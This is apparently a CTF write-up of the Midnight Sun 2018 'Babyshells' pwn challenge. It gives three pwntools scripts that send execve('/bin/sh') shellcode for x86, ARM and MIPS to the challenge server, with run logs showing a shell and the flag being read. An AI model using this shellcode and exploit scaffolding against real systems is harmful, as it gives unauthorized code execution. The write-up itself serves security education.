---
title: "Midnight Sun 2018 - Babyshells (Pwn)"
header:
  overlay_image: /assets/images/midnightsun2018/babyshells/header.jpg
  overlay_filter: 0.5
  caption: "Photo credit: Anh Nguyen on Unsplash"

tags:
  - midnightsun2018
  - writeup
  - pwn
---

Exploiting the same 'vulnerable' binary on three different architectures: x86,
ARM, MIPS.

## Challenge Description

```
If you hold a babyshell close to your ear, you can hear a stack getting smashed

Service: nc 52.30.206.11 7000 (x86) | nc 52.30.206.11 7001 (ARM) | nc 52.30.206.11 7002 (MIPS)
```

#### Points

Points: 50

Solves: 71

Author: likvidera

## Solution

Straightforward challenge that jumps to your shellcode.

### x86

Exploit script for x86:

```python
from pwn import *

shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

def main():
    #p = remote("localhost", 7000)
    p = remote("52.30.206.11", 7000)

    p.sendline("1")
    payload = shellcode.ljust(500, "\x90")

    p.send(payload)

    p.interactive()

if __name__ == "__main__":
    main()
```

Running it:

```shell
$ python exploit_x86.py
[+] Opening connection to 52.30.206.11 on port 7000: Done
[*] Switching to interactive mode

MENU
 1) Pwn
 2) Quit
 > gimme gimme: pwning!
$ cat flag
midnight{pwn_all_the_x86_
$
```

### ARM

Exploit script for ARM:

```python
from pwn import *

shellcode = "A"*40 + "01308fe213ff2fe102a049405240c2710b2701df2f62696e2f736878".decode("hex")

def main():
    #p = remote("localhost", 7001)
    p = remote("52.30.206.11", 7001)

    p.sendline("1")
    payload = shellcode.ljust(500, "\x90")

    p.send(payload)

    p.interactive()

if __name__ == "__main__":
    main()
```

Running it:

```shell
 python exploit_arm.py
[+] Opening connection to 52.30.206.11 on port 7001: Done
[*] Switching to interactive mode
MENU
 1) Pwn
 2) Quit
 > gimme gimme: pwning!
$ cat flag
pwn_all_th3_4rm$
```

### MIPS

Exploit for MIPS:

```python
from pwn import *

shellcode = (
        "\x28\x06\xff\xff"
        "\x3c\x0f\x2f\x2f"
        "\x35\xef\x62\x69"
        "\xaf\xaf\xff\xf4"
        "\x3c\x0e\x6e\x2f"
        "\x35\xce\x73\x68"
        "\xaf\xae\xff\xf8"
        "\xaf\xa0\xff\xfc"
        "\x27\xa4\xff\xf4"
        "\x28\x05\xff\xff"
        "\x24\x02\x0f\xab"
        "\x01\x01\x01\x0c\n"
        )

def main():
    #p = remote("localhost", 7002)
    p = remote("52.30.206.11", 7002)

    p.sendline("1")
    payload = shellcode.ljust(500, "\x90")

    p.send(payload)

    p.interactive()

if __name__ == "__main__":
    main()
```

Running it:

```shell
$ python exploit_mips.py
[+] Opening connection to 52.30.206.11 on port 7002: Done
[*] Switching to interactive mode
MENU
 1) Pwn
 2) Quit
 > gimme gimme: pwning!
$ cat flag
_pWN_4ll_th3_m1p5}
$
```

Flag: **midnight{pwn\_all\_the\_x86\_pwn\_all_th3\_4rm\_pWN\_4ll\_th3\_m1p5}**

